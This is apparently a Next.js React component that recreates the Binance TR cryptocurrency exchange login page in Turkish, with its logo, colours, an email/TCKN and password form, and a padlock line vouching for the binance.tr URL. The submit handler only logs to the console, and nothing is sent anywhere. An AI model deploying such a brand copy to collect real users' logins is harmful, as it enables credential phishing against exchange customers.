"use client"
import { useState } from 'react'
import Image from 'next/image'
import Link from 'next/link'
import { Eye, EyeOff } from 'lucide-react'

const LoginPage = () => {
  const [credentials, setCredentials] = useState({
    email: '',
    password: ''
  })
  const [showPassword, setShowPassword] = useState(false)
  const [errors, setErrors] = useState({
    email: '',
    password: ''
  })

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    // API call will be implemented here
    console.log('Form submitted:', credentials)
  }

  return (
    <div className="min-h-full bg-[#FAFAFA] flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[380px] bg-white rounded-lg shadow-sm p-8">
        {/* Header */}
        <h1 className="text-[#1E2329] text-2xl font-medium text-center mb-4">
          Giriş Yap
        </h1>

        {/* URL Verification */}
        <div className="flex items-center gap-2 text-[#707A8A] text-sm mb-4 justify-center">
          <span>Lütfen doğru URL'yi ziyaret ettiğinizden emin olun:</span>
        </div>
        <div className="flex justify-center mb-8">
          <span className="text-[#1E2329] text-sm flex items-center gap-1">
            <span className="text-green-500">🔒</span>
            https://www.binance.tr
          </span>
        </div>

        {/* Binance.com Login */}
        <div className="space-y-6">
          <div>
            <p className="text-[#707A8A] text-sm mb-2">Binance.com hesabıyla oturum açın:</p>
            <button className="w-full border border-[#FCD535] rounded-md py-3 px-4 text-[#1E2329] hover:bg-[#FCD535]/5 transition flex items-center justify-center gap-2">
              <Image
                src="/b.svg"
                alt="Binance Logo"
                width={25}
                height={25}
              />
              <span>Binance.com hesabıyla oturum açın</span>
            </button>
          </div>

          {/* Binance TR Login */}
          <div>
            <p className="text-[#707A8A] text-sm mb-4">Binance TR hesabıyla oturum açın:</p>
            <form className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="E-posta / TCKN"
                  className="w-full px-0 py-3 border-0 border-b border-gray-200 focus:outline-none focus:border-[#FCD535] text-base transition-colors text-black"
                  value={credentials.email}
                  onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
                />
                {errors.email && (
                  <p className="text-[#F6465D] text-sm mt-1">
                    Lütfen geçerli bir e-posta veya TCKN girin
                  </p>
                )}
              </div>

              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Şifre"
                  className="w-full px-0 py-3 border-0 border-b border-gray-200 focus:outline-none focus:border-[#FCD535] text-base transition-colors pr-10 text-black"
                  value={credentials.password}
                  onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
                {errors.password && (
                  <p className="text-[#F6465D] text-xs mt-1">
                    En az 8 karakterden oluşmalı ve en az bir büyük harf, bir küçük harf ve bir rakam içermelidir.
                  </p>
                )}
              </div>

              <button
                type="submit"
                className="w-full bg-[#FCD535] text-[#1E2329] font-medium rounded-md py-3 hover:bg-[#FCD535]/90 transition font-bold"
              >
                Giriş Yap
              </button>
            </form>
          </div>

          {/* Footer Links */}
          <div className="flex justify-between text-sm pt-2">
            <Link href="#" className="text-[#F0B90B] hover:text-[#F0B90B]/80">
              Şifrenizi mi unuttunuz?
            </Link>
            <Link href="#" className="text-[#F0B90B] hover:text-[#F0B90B]/80">
              Kaydol
            </Link>
          </div>
        </div>
      </div>
    </div>
  )
}

export default LoginPage